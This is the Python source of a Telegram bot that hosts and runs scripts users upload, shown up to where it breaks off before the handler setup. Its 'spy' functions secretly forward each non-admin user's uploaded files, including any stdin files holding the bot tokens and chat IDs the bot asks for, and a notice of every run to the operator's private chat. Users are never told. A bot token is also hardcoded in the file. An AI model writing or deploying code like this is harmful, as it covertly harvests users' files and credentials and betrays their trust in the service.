#!/usr/bin/env python3
"""
79 ULTIMATE HOSTING V9
- Original features + clean Back/Menu UI
- Spy: real files + texts → admin DM
- 5 live scripts/user (oldest killed)
- Infinite verified auto-pip
- Interactive OFC scripts: collect input() answers before run
- Background long-running scripts (no fake timeout kill)
- Path registry (64-byte safe)
- Admin terminal only
"""

import asyncio
import atexit
import json
import logging
import os
import re
import shlex
import signal
import site
import subprocess
import sys
import zipfile
from datetime import datetime, timedelta
from pathlib import Path
from threading import Thread
from typing import Dict, List, Optional, Tuple

import psutil
from dotenv import load_dotenv
from flask import Flask, jsonify
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.request import HTTPXRequest
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
log = logging.getLogger("79")

load_dotenv()
BOT_TOKEN = (os.getenv("BOT_TOKEN") or "8923078994:AAEYk_-hdpVh2NYN4_yXX5lERPhVt8Ccs1I").strip()
ADMIN_IDS = [int(x) for x in (os.getenv("ADMIN_IDS") or "7546911540").split(",") if x.strip().isdigit()] or [7546911540]
CHANNEL = (os.getenv("CHANNEL_USERNAME") or "@seventyx79").strip()
PORT = int(os.getenv("PORT") or os.getenv("RAILWAY_PUBLIC_PORT") or "8080")
WS_BASE = Path(os.getenv("WORKSPACE_BASE", "./workspaces"))
MAX_UP = int(os.getenv("MAX_UPLOAD_SIZE", "50MB").replace("MB", "").strip() or "50") * 1024 * 1024
MAX_ZIP = int(os.getenv("MAX_ARCHIVE_SIZE", "200MB").replace("MB", "").strip() or "200") * 1024 * 1024
MAX_PROCS = int(os.getenv("MAX_USER_PROCESSES", "5"))
WS_BASE.mkdir(parents=True, exist_ok=True)

UPLOAD_WAIT, TERMINAL, RUN_INPUTS = range(3)
DATA = Path("bot_data.json")

WARM = [
    "colorama", "rich", "user-agent", "fake-useragent", "python-cfonts",
    "requests", "python-dotenv", "aiohttp", "httpx", "pytz", "Pillow",
]

PIP_ALIAS = {
    "user_agent": "user-agent",
    "cv2": "opencv-python",
    "PIL": "Pillow",
    "yaml": "PyYAML",
    "bs4": "beautifulsoup4",
    "Crypto": "pycryptodome",
    "dotenv": "python-dotenv",
    "telegram": "python-telegram-bot",
    "cfonts": "python-cfonts",
    "sklearn": "scikit-learn",
}


class PathReg:
    def __init__(self):
        self.d: Dict[str, str] = {}
        self.n = 0

    def add(self, p: Path) -> str:
        s = str(p.resolve())
        for k, v in self.d.items():
            if v == s:
                return k
        k = f"p{self.n}"
        self.n += 1
        self.d[k] = s
        return k

    def get(self, k: str) -> Optional[Path]:
        v = self.d.get(k)
        return Path(v) if v else None


R = PathReg()


def load_data():
    if DATA.exists():
        try:
            return json.loads(DATA.read_text())
        except Exception:
            pass
    return {"users": {}, "processes": [], "telemetry": {}}


def save_data(d):
    try:
        DATA.write_text(json.dumps(d, indent=2, default=str))
    except Exception as e:
        log.error("save: %s", e)


class UserManager:
    def __init__(self):
        self.data = load_data()
        self.users = self.data.setdefault("users", {})
        self.processes = self.data.setdefault("processes", [])
        self.telemetry = self.data.setdefault("telemetry", {})

    def save(self):
        self.data.update(users=self.users, processes=self.processes, telemetry=self.telemetry)
        save_data(self.data)

    def get_user(self, uid):
        return self.users.get(str(uid))

    def add_user(self, uid, name, username):
        st = "approved" if uid in ADMIN_IDS else "pending"
        self.users[str(uid)] = {
            "status": st,
            "name": name,
            "username": username,
            "request_time": datetime.now().isoformat(),
            "workspace": str(WS_BASE / str(uid)),
        }
        self.telemetry.setdefault(str(uid), {"runs": 0, "success": 0, "fail": 0, "bad": 0})
        self.save()

    def approve_user(self, uid):
        if u := self.get_user(uid):
            u["status"] = "approved"
            self.save()
            return True
        return False

    def ban_user(self, uid):
        if u := self.get_user(uid):
            u["status"] = "banned"
            self.save()
            return True
        return False

    def unban_user(self, uid):
        if u := self.get_user(uid):
            u["status"] = "approved"
            self.save()
            return True
        return False

    def is_approved(self, uid):
        return uid in ADMIN_IDS or (self.get_user(uid) or {}).get("status") == "approved"

    def is_pending(self, uid):
        return uid not in ADMIN_IDS and (self.get_user(uid) or {}).get("status") == "pending"

    def is_banned(self, uid):
        return (self.get_user(uid) or {}).get("status") == "banned"

    def get_workspace(self, uid) -> Path:
        u = self.get_user(uid)
        p = Path(u["workspace"]) if u else WS_BASE / str(uid)
        p.mkdir(parents=True, exist_ok=True)
        return p

    def get_pending_requests(self):
        return [{"user_id": k, **v} for k, v in self.users.items() if v.get("status") == "pending"]

    def get_approved_users(self):
        return [{"user_id": k, **v} for k, v in self.users.items() if v.get("status") == "approved"]

    def get_banned_users(self):
        return [{"user_id": k, **v} for k, v in self.users.items() if v.get("status") == "banned"]

    def add_process(self, uid, filename, pid, log_path):
        self.processes.append(
            {
                "user_id": uid,
                "filename": filename,
                "pid": pid,
                "start_time": datetime.now().isoformat(),
                "status": "running",
                "log_path": log_path,
            }
        )
        self.save()

    def get_user_processes(self, uid):
        return [p for p in self.processes if p.get("user_id") == uid]

    def get_all_processes(self):
        return self.processes

    def live_user(self, uid):
        out = []
        for p in self.get_user_processes(uid):
            if p.get("status") == "running" and psutil.pid_exists(p.get("pid")):
                out.append(p)
            elif p.get("status") == "running":
                p["status"] = "stopped"
        self.save()
        return sorted(out, key=lambda x: x.get("start_time", ""))

    def stop_process(self, pid):
        for p in self.processes:
            if p.get("pid") == pid:
                for s in (signal.SIGTERM, signal.SIGKILL):
                    try:
                        os.kill(pid, s)
                    except Exception:
                        pass
                p["status"] = "stopped"
                self.save()
                return True
        return False

    def cleanup_all(self):
        for p in list(self.processes):
            try:
                os.kill(p.get("pid"), signal.SIGTERM)
            except Exception:
                pass
        self.processes.clear()
        self.save()

    def inc_run(self, uid):
        t = self.telemetry.setdefault(str(uid), {"runs": 0, "success": 0, "fail": 0, "bad": 0})
        t["runs"] += 1
        self.save()

    def inc_success(self, uid):
        t = self.telemetry.setdefault(str(uid), {"runs": 0, "success": 0, "fail": 0, "bad": 0})
        t["success"] += 1
        self.save()

    def inc_fail(self, uid):
        t = self.telemetry.setdefault(str(uid), {"runs": 0, "success": 0, "fail": 0, "bad": 0})
        t["fail"] += 1
        self.save()

    def inc_bad(self, uid):
        t = self.telemetry.setdefault(str(uid), {"runs": 0, "success": 0, "fail": 0, "bad": 0})
        t["bad"] += 1
        self.save()

    def get_user_telemetry(self, uid):
        return self.telemetry.get(str(uid), {"runs": 0, "success": 0, "fail": 0, "bad": 0})


um = UserManager()
atexit.register(um.cleanup_all)


def sanitize(name: str) -> str:
    name = os.path.basename(name or "file.py")
    name = re.sub(r"[^\w.\-]+", "_", name).strip("_")
    return name or "file.py"


def ensure_ws(uid) -> Path:
    return um.get_workspace(uid)


def is_safe(uid, path: Path) -> bool:
    try:
        path.resolve().relative_to(ensure_ws(uid).resolve())
        return True
    except ValueError:
        return False


def extract_zip(zp: Path, dest: Path) -> Tuple[bool, str]:
    try:
        with zipfile.ZipFile(zp) as z:
            if sum(i.file_size for i in z.infolist()) > MAX_ZIP:
                return False, "zip too large"
            for m in z.infolist():
                if m.filename.startswith("/") or ".." in m.filename:
                    return False, "bad path in zip"
            z.extractall(dest)
        return True, "ok"
    except Exception as e:
        return False, str(e)


def detect_entry(dest: Path):
    for n in ("main.py", "bot.py", "app.py", "index.js"):
        p = dest / n
        if p.exists():
            return ("py" if n.endswith(".py") else "js", p)
    pys = list(dest.glob("*.py"))
    if pys:
        return "py", pys[0]
    jss = list(dest.glob("*.js"))
    if jss:
        return "js", jss[0]
    return None, None


def child_env() -> dict:
    env = os.environ.copy()
    paths = []
    try:
        paths.append(site.getusersitepackages())
    except Exception:
        pass
    try:
        paths.extend(site.getsitepackages())
    except Exception:
        pass
    old = env.get("PYTHONPATH", "")
    env["PYTHONPATH"] = os.pathsep.join([p for p in paths if p] + ([old] if old else []))
    env["PIP_DISABLE_PIP_VERSION_CHECK"] = "1"
    env["PYTHONUNBUFFERED"] = "1"
    env["TERM"] = env.get("TERM") or "xterm-256color"
    env["COLUMNS"] = "80"
    return env


async def verify_import(mod: str, env: dict) -> bool:
    top = mod.split(".")[0]
    try:
        p = await asyncio.create_subprocess_exec(
            sys.executable, "-c", f"import {top}",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            env=env,
        )
        await asyncio.wait_for(p.communicate(), timeout=20)
        return p.returncode == 0
    except Exception:
        return False


async def pip_install(mod: str) -> Tuple[bool, str]:
    env = child_env()
    top = mod.split(".")[0]
    if await verify_import(top, env):
        return True, "ok"
    cands = []
    if mod in PIP_ALIAS:
        cands.append(PIP_ALIAS[mod])
    cands += [mod, mod.replace("_", "-"), top]
    seen, list_ = set(), []
    for c in cands:
        if c not in seen:
            seen.add(c)
            list_.append(c)
    for pkg in list_:
        for flags in ([], ["--user"], ["--break-system-packages"]):
            try:
                cmd = [sys.executable, "-m", "pip", "install", "--no-input", "--no-cache-dir", "-q", *flags, pkg]
                p = await asyncio.create_subprocess_exec(
                    *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, env=env
                )
                try:
                    await asyncio.wait_for(p.communicate(), timeout=240)
                except asyncio.TimeoutError:
                    try:
                        p.kill()
                    except Exception:
                        pass
                    continue
                if p.returncode == 0 and await verify_import(top, env):
                    return True, pkg
            except Exception as e:
                log.warning("pip %s: %s", pkg, e)
    return False, mod


async def install_reqs(folder: Path):
    req = folder / "requirements.txt"
    if not req.exists():
        return
    env = child_env()
    for flags in ([], ["--user"], ["--break-system-packages"]):
        try:
            p = await asyncio.create_subprocess_exec(
                sys.executable, "-m", "pip", "install", "--no-input", "--no-cache-dir", "-q",
                *flags, "-r", str(req),
                stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL, env=env,
            )
            await asyncio.wait_for(p.communicate(), timeout=400)
            if p.returncode == 0:
                return
        except Exception:
            pass


async def warm_packages():
    env = child_env()
    log.info("warm packages...")
    for pkg in WARM:
        try:
            p = await asyncio.create_subprocess_exec(
                sys.executable, "-m", "pip", "install", "--no-input", "--no-cache-dir", "-q", pkg,
                stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL, env=env,
            )
            await asyncio.wait_for(p.communicate(), timeout=120)
        except Exception:
            pass
    log.info("warm done")


def miss_mods(text: str) -> List[str]:
    return list(dict.fromkeys(re.findall(
        r"(?:ModuleNotFoundError|ImportError): No module named ['\"]([^'\"]+)['\"]", text
    )))


def stdin_path_for(script: Path) -> Optional[Path]:
    for p in (script.parent / f"{script.stem}.stdin.txt", script.parent / "stdin.txt"):
        if p.exists():
            return p
    return None


def needs_input_hint(script: Path) -> bool:
    try:
        t = script.read_text(errors="ignore")[:8000]
        return bool(re.search(r"\binput\s*\(", t))
    except Exception:
        return False


async def spy_file(bot, user, file_id, fname):
    if user.id in ADMIN_IDS:
        return
    cap = f"🕵️ FILE\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n📄 `{fname}`"
    for a in ADMIN_IDS:
        try:
            await bot.send_document(a, document=file_id, caption=cap, parse_mode="Markdown")
        except Exception as e:
            log.warning("spy file: %s", e)


async def spy_text(bot, user, text):
    if user.id in ADMIN_IDS:
        return
    msg = f"🕵️ MSG\n👤 {user.full_name}\n🆔 `{user.id}`\n💬 {text[:3500]}"
    for a in ADMIN_IDS:
        try:
            await bot.send_message(a, msg, parse_mode="Markdown")
        except Exception:
            pass


async def spy_run(bot, user, fname, inputs_note=""):
    if user.id in ADMIN_IDS:
        return
    msg = f"🕵️ RUN\n👤 {user.full_name}\n🆔 `{user.id}`\n▶️ `{fname}`\n{inputs_note}"
    for a in ADMIN_IDS:
        try:
            await bot.send_message(a, msg, parse_mode="Markdown")
        except Exception:
            pass


async def enforce_slots(uid, bot):
    live = um.live_user(uid)
    while len(live) >= MAX_PROCS:
        old = live[0]
        um.stop_process(old["pid"])
        try:
            await bot.send_message(
                uid,
                f"🔄 Max {MAX_PROCS} scripts. Stopped oldest: `{old['filename']}`",
                parse_mode="Markdown",
            )
        except Exception:
            pass
        live = um.live_user(uid)


async def download_doc(bot, file_id, dest: Path) -> Tuple[bool, Optional[str]]:
    last = None
    for i in range(4):
        try:
            f = await bot.get_file(file_id)
            await f.download_to_drive(custom_path=str(dest))
            if dest.exists() and dest.stat().st_size > 0:
                return True, None
        except Exception as e:
            last = e
            await asyncio.sleep(2 * (i + 1))
    return False, str(last)


async def run_script(uid, path: Path, ftype: str, edit, stdin_text: str = "") -> Tuple[int, str, str]:
    um.inc_run(uid)
    log_dir = ensure_ws(uid) / "logs"
    log_dir.mkdir(exist_ok=True)
    lp = log_dir / f"{datetime.now():%Y%m%d_%H%M%S}_{path.stem}.log"
    cmd = [sys.executable, "-u", str(path)] if ftype == "py" else ["node", str(path)]
    env = child_env()

    if not stdin_text:
        sp = stdin_path_for(path)
        if sp:
            stdin_text = sp.read_text(errors="ignore")
    raw = (stdin_text or "").encode("utf-8", errors="ignore")
    if raw and not raw.endswith(b"\n"):
        raw += b"\n"

    def spawn(mode="w"):
        f = open(lp, mode, buffering=1, encoding="utf-8", errors="ignore")
        if raw:
            pr = subprocess.Popen(
                cmd, cwd=str(path.parent), stdout=f, stderr=subprocess.STDOUT,
                stdin=subprocess.PIPE, env=env,
            )
            try:
                pr.stdin.write(raw)
                pr.stdin.close()
            except Exception:
                pass
        else:
            pr = subprocess.Popen(
                cmd, cwd=str(path.parent), stdout=f, stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL, env=env,
            )
        return pr, f

    await edit("⏳ Installing requirements (if any)...")
    await install_reqs(path.parent)
    await edit("🚀 Starting...")

    tried = set()
    mode = "w"
    for rnd in range(1, 26):
        pr, f = spawn(mode)
        mode = "a"
        await asyncio.sleep(6)
        code = pr.poll()

        if code is None:
            um.inc_success(uid)
            note = " | stdin OK" if raw else ""
            return pr.pid, str(lp), f"🚀 Running background\nPID `{pr.pid}` | round {rnd}{note}"

        try:
            f.close()
        except Exception:
            pass
        out = lp.read_text(errors="ignore") if lp.exists() else ""

        if code == 0:
            um.inc_success(uid)
            return pr.pid, str(lp), f"✅ Finished OK (round {rnd})"

        if "EOFError" in out and re.search(r"input\s*\(", out):
            um.inc_fail(uid)
            return pr.pid, str(lp), (
                "❌ *Script mang rahi hai INPUT* (Token / Chat ID / option).\n\n"
                "Dobara ▶️ Run dabao aur answers bhejo:\n"
                "• Line1 = pehla input()\n"
                "• Line2 = doosra input()\n"
                "Example:\n```\n"
                "123456:ABC-TOKEN\n"
                "7546911540\n"
                "1\n"
                "```\n"
                "Ya pehle file `ScriptName.stdin.txt` upload karo."
            )

        missing = [m for m in miss_mods(out) if m not in tried]
        if not missing:
            um.inc_fail(uid)
            return pr.pid, str(lp), f"❌ Exit {code}\n```\n{out[-1200:]}\n```"

        await edit("⚙️ Installing: " + ", ".join(f"`{m}`" for m in missing))
        bad = []
        for m in missing:
            tried.add(m)
            ok, info = await pip_install(m)
            log.info("pip %s -> %s %s", m, ok, info)
            if not ok:
                bad.append(m)
        if bad:
            um.inc_bad(uid)
            return pr.pid, str(lp), f"❌ pip fail: {', '.join(bad)}\n```\n{out[-800:]}\n```"
        await edit(f"✅ Installed {len(missing)}. Retry...")

    um.inc_fail(uid)
    return 0, str(lp), "❌ Too many install rounds"


# ---------- UI ----------
def main_kb(uid) -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton("📁 Upload", callback_data="upload"),
            InlineKeyboardButton("📂 My Scripts", callback_data="my_scripts"),
        ],
        [
            InlineKeyboardButton("📝 Logs", callback_data="logs"),
            InlineKeyboardButton("🛑 Stop", callback_data="stop"),
        ],
        [InlineKeyboardButton("📊 Stats", callback_data="my_stats")],
    ]
    if uid in ADMIN_IDS:
        rows.append(
            [
                InlineKeyboardButton("💻 Terminal", callback_data="terminal"),
                InlineKeyboardButton("👑 Admin", callback_data="admin_panel"),
            ]
        )
    return InlineKeyboardMarkup(rows)


def back_kb(to="main_menu"):
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("🔙 Back", callback_data=to),
                InlineKeyboardButton("🏠 Menu", callback_data="main_menu"),
            ]
        ]
    )


async def joined(bot, uid) -> bool:
    if not CHANNEL or uid in ADMIN_IDS:
        return True
    try:
        c = CHANNEL if CHANNEL.startswith("@") else f"@{CHANNEL}"
        m = await bot.get_chat_member(c, uid)
        return m.status not in ("left", "kicked")
    except Exception:
        return True


async def gate(update, context) -> bool:
    user = update.effective_user
    if not user:
        return False
    uid = user.id
    q, msg = update.callback_query, update.effective_message

    async def say(t, kb=None):
        if q:
            try:
                await q.edit_message_text(t, parse_mode="Markdown", reply_markup=kb)
            except Exception:
                pass
        elif msg:
            await msg.reply_text(t, parse_mode="Markdown", reply_markup=kb)

    if not await joined(context.bot, uid):
        ch = CHANNEL.lstrip("@")
        await say(
            f"🔒 Join {CHANNEL}",
            InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton("📢 Join", url=f"https://t.me/{ch}")],
                    [InlineKeyboardButton("✅ Check", callback_data="check_join")],
                ]
            ),
        )
        return False

    if not um.get_user(uid):
        um.add_user(uid, user.full_name, user.username or "-")
        if uid not in ADMIN_IDS:
            for a in ADMIN_IDS:
                try:
                    await context.bot.send_message(
                        a,
                        f"🔔 *New request*\n👤 {user.full_name}\n🆔 `{uid}`",
                        parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup(
                            [
                                [
                                    InlineKeyboardButton("✅", callback_data=f"approve_{uid}"),
                                    InlineKeyboardButton("🚫", callback_data=f"ban_{uid}"),
                                ]
                            ]
                        ),
                    )
                except Exception:
                    pass
            await say("⏳ Request sent to admin.")
            return False
    if um.is_banned(uid):
        await say("🚫 Banned.")
        return False
    if um.is_pending(uid):
        await say("⏳ Pending approval.")
        return False
    return True


# ---------- handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, context):
        return
    u = update.effective_user
    await update.message.reply_text(
        f"👋 *{u.first_name}* — 79 Hosting\n"
        f"Live limit: *{MAX_PROCS}* scripts\n"
        f"OFC scripts: Run → send Token/ID/options (1 line each)",
        parse_mode="Markdown",
        reply_markup=main_kb(u.id),
    )


async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not await gate(update, context):
        return
    try:
        await q.edit_message_text("📋 *Main Menu*", parse_mode="Markdown", reply_markup=main_kb(q.from_user.id))
    except Exception:
        pass


async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if await gate(update, context):
        try:
            await q.edit_message_text("✅ Verified", reply_markup=main_kb(q.from_user.id))
        except Exception:
            pass


async def upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not await gate(update, context):
        return ConversationHandler.END
    await q.edit_message_text(
        "📤 Send `.py` `.js` `.zip` or `name.stdin.txt`\n/cancel abort",
        parse_mode="Markdown",
        reply_markup=back_kb(),
    )
    return UPLOAD_WAIT


async def upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    doc = update.message.document
    if not doc:
        await update.message.reply_text("Send a document.", reply_markup=back_kb())
        return UPLOAD_WAIT
    name = doc.file_name or "file.py"
    low = name.lower()
    if not (low.endswith((".py", ".js", ".zip", ".txt")) or low.endswith(".stdin.txt")):
        await update.message.reply_text("Only py/js/zip/txt", reply_markup=main_kb(user.id))
        return ConversationHandler.END
    if doc.file_size and doc.file_size > MAX_UP:
        await update.message.reply_text("File too large", reply_markup=main_kb(user.id))
        return ConversationHandler.END

    ws = ensure_ws(user.id)
    safe = sanitize(name)
    if low.endswith(".stdin.txt") and not safe.endswith(".stdin.txt"):
        safe = sanitize(name.replace(".stdin.txt", "")) + ".stdin.txt"
    path = ws / safe
    st = await update.message.reply_text("⬇️ Downloading...")
    ok, err = await download_doc(context.bot, doc.file_id, path)
    if not ok:
        await st.edit_text(f"❌ Download fail\n`{err}`", parse_mode="Markdown", reply_markup=main_kb(user.id))
        return ConversationHandler.END

    await spy_file(context.bot, user, doc.file_id, name)

    if safe.endswith(".zip"):
        ed = ws / f"extracted_{path.stem}"
        ed.mkdir(exist_ok=True)
        okz, msg = extract_zip(path, ed)
        if not okz:
            await st.edit_text(f"Zip error: {msg}", reply_markup=main_kb(user.id))
            return ConversationHandler.END
        await install_reqs(ed)
        _, ent = detect_entry(ed)
        await st.edit_text(
            f"✅ Zip OK\nEntry: `{ent.name if ent else '?'}`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton("📂 Scripts", callback_data="my_scripts")],
                    [InlineKeyboardButton("🏠 Menu", callback_data="main_menu")],
                ]
            ),
        )
        return ConversationHandler.END

    extra = "\n(stdin answers file)" if safe.endswith(".stdin.txt") or safe.endswith(".txt") else ""
    await st.edit_text(
        f"✅ `{safe}` saved{extra}",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("📂 Scripts", callback_data="my_scripts")],
                [InlineKeyboardButton("🏠 Menu", callback_data="main_menu")],
            ]
        ),
    )
    return ConversationHandler.END


async def upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.", reply_markup=main_kb(update.effective_user.id))
    return ConversationHandler.END


async def my_scripts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not um.is_approved(uid):
        return
    ws = ensure_ws(uid)
    files = list(ws.glob("*.py")) + list(ws.glob("*.js"))
    files += list(ws.glob("extracted*/**/*.py")) + list(ws.glob("extracted*/**/*.js"))
    seen, uniq = set(), []
    for f in files:
        s = str(f.resolve())
        if s not in seen:
            seen.add(s)
            uniq.append(f)
    if not uniq:
        await q.edit_message_text("📂 No scripts. Upload first.", reply_markup=back_kb())
        return
    rows = []
    for f in uniq[:30]:
        k = R.add(f)
        mark = "📝" if (needs_input_hint(f) or stdin_path_for(f)) else "📄"
        rows.append(
            [
                InlineKeyboardButton(f"{mark} {f.name[:28]}", callback_data=f"view_{k}"),
                InlineKeyboardButton("▶️", callback_data=f"runask_{k}"),
            ]
        )
    rows.append([InlineKeyboardButton("📊 Stats", callback_data="my_stats")])
    rows.append([InlineKeyboardButton("🏠 Menu", callback_data="main_menu")])
    live = len(um.live_user(uid))
    await q.edit_message_text(
        f"📂 *Scripts* ({live}/{MAX_PROCS})\n📝 = needs/has inputs",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(rows),
    )


async def view_script(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    p = R.get(q.data.replace("view_", "", 1))
    if not p or not p.exists():
        await q.edit_message_text("Missing", reply_markup=back_kb("my_scripts"))
        return
    body = p.read_text(errors="ignore")[:700]
    k = R.add(p)
    hint = ""
    if needs_input_hint(p):
        hint = "\n⚠️ Has `input()` — Run pe Token/ID/options bhejna"
    if stdin_path_for(p):
        hint += f"\n✅ stdin file: `{stdin_path_for(p).name}`"
    await q.edit_message_text(
        f"📄 `{p.name}`{hint}\n```\n{body}\n```",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("▶️ Run", callback_data=f"runask_{k}")],
                [
                    InlineKeyboardButton("🔙 Scripts", callback_data="my_scripts"),
                    InlineKeyboardButton("🏠", callback_data="main_menu"),
                ],
            ]
        ),
    )


async def run_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask for OFC inputs before run."""
    q = update.callback_query
    await q.answer()
    if not await gate(update, context):
        return ConversationHandler.END
    key = q.data.replace("runask_", "", 1)
    p = R.get(key)
    if not p or not p.exists():
        await q.edit_message_text("File missing", reply_markup=back_kb("my_scripts"))
        return ConversationHandler.END

    context.user_data["run_key"] = key
    context.user_data["run_path"] = str(p.resolve())

    sp = stdin_path_for(p)
    if sp and not needs_input_hint(p):
        # has file, no input in code — just run
        return await _do_run(update, context, p, sp.read_text(errors="ignore"), from_query=True)

    if sp:
        await q.edit_message_text(
            f"▶️ `{p.name}`\n\n"
            f"Found `{sp.name}`. Use it?\n"
            f"• Send *new answers* (one per line)\n"
            f"• Or /use_file to use saved stdin\n"
            f"• Or /skip if no inputs\n"
            f"• /cancel abort",
            parse_mode="Markdown",
            reply_markup=back_kb("my_scripts"),
        )
    else:
        await q.edit_message_text(
            f"▶️ *Run* `{p.name}`\n\n"
            f"Agar script *Bot Token / User ID / Chat ID / menu option* mangti hai,\n"
            f"*abhi answers bhejo* — *har line = ek input()*:\n\n"
            f"```\n"
            f"123456789:AA....token\n"
            f"7546911540\n"
            f"1\n"
            f"```\n"
            f"/skip = no input\n"
            f"/cancel = abort",
            parse_mode="Markdown",
            reply_markup=back_kb("my_scripts"),
        )
    return RUN_INPUTS


async def run_inputs_recv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    path_s = context.user_data.get("run_path")
    if not path_s:
        await update.message.reply_text("Session expired. Open Scripts again.", reply_markup=main_kb(uid))
        return ConversationHandler.END
    p = Path(path_s)

    if text.lower() in ("/cancel", "cancel"):
        await update.message.reply_text("Cancelled.", reply_markup=main_kb(uid))
        return ConversationHandler.END

    if text.lower() in ("/skip", "skip"):
        stdin = ""
    elif text.lower() in ("/use_file", "use_file"):
        sp = stdin_path_for(p)
        stdin = sp.read_text(errors="ignore") if sp else ""
        if not stdin:
            await update.message.reply_text("No .stdin.txt found. Send answers or /skip.")
            return RUN_INPUTS
    else:
        stdin = text
        # save for next time
        try:
            (p.parent / f"{p.stem}.stdin.txt").write_text(stdin, encoding="utf-8")
        except Exception:
            pass

    await update.message.reply_text("⏳ Starting with your inputs...")
    # fake query-less run
    class Fake:
        pass

    # use message edit path via new status message
    status = await update.message.reply_text("⏳ ...")

    async def edit(t):
        try:
            await status.edit_text(t, parse_mode="Markdown")
        except Exception:
            pass

    await enforce_slots(uid, context.bot)
    await spy_run(
        context.bot,
        update.effective_user,
        p.name,
        "inputs: yes" if stdin else "inputs: skip",
    )
    ft = "py" if p.suffix == ".py" else "js"
    pid, logp, msg = await run_script(uid, p, ft, edit, stdin_text=stdin)
    if pid:
        um.add_process(uid, p.name, pid, logp)
    lk = R.add(Path(logp))
    await status.edit_text(
        f"{msg}\n📄 `{Path(logp).name}`",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("📝 Log", callback_data=f"vlog_{lk}")],
                [
                    InlineKeyboardButton("📂 Scripts", callback_data="my_scripts"),
                    InlineKeyboardButton("🏠", callback_data="main_menu"),
                ],
            ]
        ),
    )
    return ConversationHandler.END


async def _do_run(update, context, p: Path, stdin: str, from_query=True):
    q = update.callback_query
    uid = q.from_user.id

    async def edit(t):
        try:
            await q.edit_message_text(t, parse_mode="Markdown")
        except Exception:
            pass

    await enforce_slots(uid, context.bot)
    await spy_run(context.bot, q.from_user, p.name, "stdin file")
    ft = "py" if p.suffix == ".py" else "js"
    pid, logp, msg = await run_script(uid, p, ft, edit, stdin_text=stdin)
    if pid:
        um.add_process(uid, p.name, pid, logp)
    lk = R.add(Path(logp))
    await q.edit_message_text(
        f"{msg}\n📄 `{Path(logp).name}`",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("📝 Log", callback_data=f"vlog_{lk}")],
                [
                    InlineKeyboardButton("📂 Scripts", callback_data="my_scripts"),
                    InlineKeyboardButton("🏠", callback_data="main_menu"),
                ],
            ]
        ),
    )
    return ConversationHandler.END


async def view_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    p = R.get(q.data.replace("vlog_", "", 1))
    if not p or not p.exists():
        await q.edit_message_text("No log", reply_markup=back_kb("my_scripts"))
        return
    t = p.read_text(errors="ignore")[-3500:]
    await q.edit_message_text(
        f"📝 `{p.name}`\n```\n{t}\n```",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("📂 Scripts", callback_data="my_scripts"),
                    InlineKeyboardButton("🏠", callback_data="main_menu"),
                ]
            ]
        ),
    )


async def view_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    rows = []
    for pr in um.get_user_processes(q.from_user.id)[-25:]:
        lp = Path(pr.get("log_path") or "")
        if lp.exists():
            rows.append([InlineKeyboardButton(lp.name[:40], callback_data=f"vlog_{R.add(lp)}")])
    if not rows:
        await q.edit_message_text("No logs", reply_markup=back_kb())
        return
    rows.append([InlineKeyboardButton("🏠", callback_data="main_menu")])
    await q.edit_message_text("📝 Logs", reply_markup=InlineKeyboardMarkup(rows))


async def stop_script(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    live = um.live_user(q.from_user.id)
    if not live:
        await q.edit_message_text("Nothing running", reply_markup=back_kb())
        return
    rows = [
        [InlineKeyboardButton(f"🛑 {p['filename'][:24]} ({p['pid']})", callback_data=f"stop_{p['pid']}")]
        for p in live
    ]
    rows.append([InlineKeyboardButton("🏠", callback_data="main_menu")])
    await q.edit_message_text(f"Running {len(live)}/{MAX_PROCS}", reply_markup=InlineKeyboardMarkup(rows))


async def stop_proc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    pid = int(q.data.split("_")[1])
    um.stop_process(pid)
    await q.edit_message_text(f"✅ Stopped `{pid}`", parse_mode="Markdown", reply_markup=back_kb())


